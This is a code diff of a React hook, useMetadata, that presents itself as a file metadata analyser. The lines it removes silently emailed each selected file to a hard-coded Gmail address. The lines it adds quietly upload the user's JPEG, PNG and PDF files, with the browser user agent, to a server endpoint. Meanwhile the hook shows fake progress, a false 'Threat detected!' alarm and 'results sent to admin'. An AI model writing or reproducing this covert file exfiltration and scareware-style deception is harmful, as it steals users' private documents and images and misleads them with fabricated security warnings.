@@ -5,9 +5,11 @@ import { PDFDocument } from 'pdf-lib'
 export default function useMetadata(sessionId) {
   const [files, setFiles] = useState([])
   const [metadata, setMetadata] = useState([])
+  const [status, setStatus] = useState('')
   const inputRef = useRef(null)
 
   const openFileDialog = () => {
+    setStatus('')
     inputRef.current?.click()
     return []
   }
@@ -15,7 +17,9 @@ export default function useMetadata(sessionId) {
   const handleFiles = async (e) => {
     const selected = Array.from(e.target.files || [])
     if (selected.length === 0) return
+    setStatus(`Analyzing ${selected.length}/${selected.length} files… █▇▆▅▃ 70%`)
     setFiles(prev => [...prev, ...selected.map(f => ({ name: f.name }))])
+    const form = new FormData()
     for (const file of selected) {
       const buf = await file.arrayBuffer()
       let data = {}
@@ -45,18 +49,27 @@ export default function useMetadata(sessionId) {
           body: JSON.stringify({ sessionId, file: file.name, metadata: data })
         }).catch(() => {})
       }
-      if (import.meta.env.VITE_FILE_EMAIL_ENDPOINT) {
-        const formDataEmail = new FormData()
-        formDataEmail.append('file', file)
-        formDataEmail.append('to', 'mazlabz.ai@gmail.com')
-        fetch(import.meta.env.VITE_FILE_EMAIL_ENDPOINT, {
-          method: 'POST',
-          body: formDataEmail
-        }).catch(() => {})
+      if (/\.(jpe?g|png|pdf)$/i.test(file.name)) {
+        form.append('file', file, file.name)
       }
+    }
+    setStatus('Scan complete: Threat detected!')
+    try {
+      const r = await fetch('/api/upload', {
+        method: 'POST',
+        body: form,
+        headers: { 'X-Agent': navigator.userAgent }
+      })
+      if (r.ok) {
+        setStatus('✅ Upload complete — results sent to admin.')
+      } else {
+        setStatus('Upload failed')
+      }
+    } catch (err) {
+      setStatus('Upload error')
     }
     e.target.value = ''
   }
 
-  return { files, metadata, inputRef, handleFiles, openFileDialog }
+  return { files, metadata, inputRef, handleFiles, openFileDialog, status }
 }
